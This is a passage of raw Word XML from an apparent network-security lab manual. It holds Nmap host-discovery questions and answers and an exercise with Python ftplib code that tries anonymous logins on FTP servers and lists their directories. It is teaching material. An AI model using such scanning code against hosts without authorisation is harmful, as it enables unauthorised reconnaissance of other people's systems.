        </w:rPr>
        <w:t>3. Which Nmap option is used only for host discovery?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4B956F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:The -sn option is used for host discovery without scanning ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B0869B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3328ECDC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>nmap -sn 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441373D6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. What protocols are commonly used by Nmap for host discovery?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394FB042" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Nmap commonly uses:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4129B3CF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ICMP Echo Requests (Ping) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E3F240" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ARP Requests </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED16A39" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">TCP SYN Ping </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E4F8FB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">TCP ACK Ping </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65307ACA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">UDP Ping </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE38DC6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. What is an ARP scan in Nmap?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C2981C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:An ARP scan sends Address Resolution Protocol requests to discover active devices on a local network and is very effective in LAN environments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F521FF8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5731A8D4" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CA156F8" w14:textId="098BE736" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Ex.No:7    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149234E6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="0062132D">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ANONYMOUS FTP SCANNER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48041600" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCCCB8D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>To build an anonymous ftp scanner using ftplib module in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA9B9FC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6050E99D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>FTP Scanner:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1F098C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A tool that automatically scans IPs/hosts for active FTP servers. It tests connectivity and credentials, reporting successful logins and vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BE0DB7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>ftplib:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6620CE64" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A built in Python library for working with the File Transfer Protocol (FTP). It allows connecting to FTP servers, logging in, listing directories, and transferring files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139AB2EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CE73A8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Import the `ftplib` module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B37B3CB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Define a function that accepts a hostname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F962B1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Inside the function, create an FTP connection to the hostname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544BE229" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Attempt to log in with username `"anonymous"` and password `"anonymous"`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E303221" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Store the server’s response from the login attempt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A002A21" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>6. If the response contains `"230 Anonymous access granted"`, proceed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135CFD7F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>7. Print a success message with the hostname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7175ABE1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>8. Display the server’s welcome message and directory listing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4FC029" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>9. If an exception occurs, print the error and a failure message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708BD49C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>10. Call the function with the desired hostname or IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F685E35" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECC50D4" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21F2E2B5" w14:textId="06B6D314" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF01038" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import ftplib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAB25B5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def anonymousLogin(hostname):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D28A37" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0D2465" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        ftp = ftplib.FTP(hostname)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C39E3F3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        response = ftp.login('anonymous', 'anonymous')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63EAB006" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6FD2B6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        if "230 Anonymous access granted" in response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F3659D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            print('\n[*] ' + str(hostname) +' FTP Anonymous Login Succeeded.')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658DF52D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(ftp.getwelcome())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1203A195" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            ftp.dir()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305A89A0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5E9751" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(str(e))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DFD03F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        print('\n[-] ' + str(hostname) +' FTP Anonymous Login Failed.')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C44E836" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>hostname = 'ftp.be.debian.org'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8D4C0A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>anonymousLogin(hostname)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09AAEF2E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A8F1010" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7DA67F7D" w14:textId="6F458F15" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7775DF0F" w14:textId="532711BC" w:rsidR="0094061E" w:rsidRDefault="001F0ABB" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="001F0ABB">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1CE03B88" wp14:editId="615888E7">
            <wp:extent cx="5731510" cy="4617720"/>
